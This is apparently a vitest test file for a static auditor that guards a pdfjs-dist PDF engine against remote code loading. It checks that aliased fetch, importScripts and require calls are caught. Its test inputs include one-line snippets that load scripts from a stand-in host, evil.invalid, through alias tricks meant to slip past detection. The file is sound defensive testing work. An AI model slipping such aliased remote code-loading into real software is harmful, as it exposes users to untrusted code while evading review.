/** #369: even a statically bound alias of a code-loading sink must be audited. */
import { copyFileSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { inspectPdfEngineProvenance369 } from "../scripts/audit-pdf-engine-provenance-369";

const repository = resolve(import.meta.dirname, "..");
const temporary = mkdtempSync(join(tmpdir(), "pdf369-callee-alias-"));
let next = 0;
const assets = [
  "build/pdf.mjs", "build/pdf.worker.mjs", "legacy/build/pdf.mjs", "package.json", "LICENSE",
  "wasm/jbig2.wasm", "wasm/openjpeg.wasm", "wasm/qcms_bg.wasm", "wasm/quickjs-eval.wasm",
  "wasm/LICENSE_JBIG2", "wasm/LICENSE_QCMS", "wasm/LICENSE_PDFJS_JBIG2",
  "wasm/LICENSE_OPENJPEG", "wasm/LICENSE_PDFJS_OPENJPEG", "wasm/LICENSE_PDFJS_QCMS",
  "standard_fonts/LICENSE_LIBERATION", "standard_fonts/LICENSE_FOXIT", "cmaps/LICENSE",
];

function project(code: string): string {
  const root = join(temporary, String(next++));
  for (const file of assets) {
    const target = join(root, "node_modules/pdfjs-dist", file);
    mkdirSync(dirname(target), { recursive: true });
    copyFileSync(join(repository, "node_modules/pdfjs-dist", file), target);
  }
  const file = join(root, "src/engines/pdf/probe.ts");
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, code);
  const manifest = JSON.parse(readFileSync(join(repository, "package.json"), "utf8"));
  const lock = JSON.parse(readFileSync(join(repository, "package-lock.json"), "utf8"));
  writeFileSync(join(root, "package.json"), JSON.stringify({
    dependencies: { "pdfjs-dist": manifest.dependencies["pdfjs-dist"] },
  }));
  writeFileSync(join(root, "package-lock.json"), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      "": { dependencies: { "pdfjs-dist": lock.packages[""].dependencies["pdfjs-dist"] } },
      "node_modules/pdfjs-dist": lock.packages["node_modules/pdfjs-dist"],
    },
  }));
  return root;
}

afterAll(() => rmSync(temporary, { recursive: true, force: true }));

describe("#369 local lexical aliases of executable remote sinks", () => {
  it.each([
    ["fetch alias", 'const downloader = fetch; downloader("https://evil.invalid/x");', /remote fetch/u],
    ["importScripts alias", 'const loader = importScripts; loader("https://evil.invalid/a.js", "https://evil.invalid/b.js");', /remote importScripts/u],
    ["require MuPDF alias", 'const load = require; load("mupdf");', /MuPDF/u],
    ["multiple constant aliases", 'const first = fetch; const second = first; second(new URL("./payload", "https://evil.invalid/base/"));', /remote fetch/u],
    ["nested lexical alias", 'const downloader = fetch; { const inner = downloader; inner("https://evil.invalid/pkg.mjs"); }', /remote fetch/u],
    ["aliased importScripts later argument", 'const load = importScripts; load("./local.js", "https://evil.invalid/worker.js");', /remote importScripts/u],
    ["mutable possible alias", 'let downloader = fetch; downloader("https://evil.invalid/x");', /remote fetch/u],
    ["mutable alias acquired later", 'let downloader; downloader = fetch; downloader("https://evil.invalid/x");', /remote fetch/u],
  ])("rejects %s", (_label, source, diagnostic) => {
    expect(() => inspectPdfEngineProvenance369(project(source)))
      .toThrow(diagnostic);
  }, 60_000);

  it.each([
    ["benign aliased local URL", 'const downloader = fetch; downloader(new URL("./image.wasm", import.meta.url));'],
    ["same-named local constant shadow", 'const fetch = (_url: string) => undefined; fetch("https://evil.invalid/a");'],
    ["nested block shadow preserves outer alias", 'const downloader = fetch; { const downloader = (_url: string) => null; downloader("https://evil.invalid/ignored"); } downloader("./local.mjs");'],
    ["function argument shadows global fetch", 'function preview(fetch: (url: string) => void) { fetch("https://evil.invalid/ignored"); }'],
    ["function argument shadows outer alias", 'const downloader = fetch; function preview(downloader: (url: string) => void) { downloader("https://evil.invalid/ignored"); }'],
    ["non-sink local helper", 'const downloader = (_url: string) => null; downloader("https://evil.invalid/ignored");'],
  ])("keeps benign %s", (_label, source) => {
    expect(inspectPdfEngineProvenance369(project(source)).imports.remoteCount).toBe(0);
  }, 60_000);
});
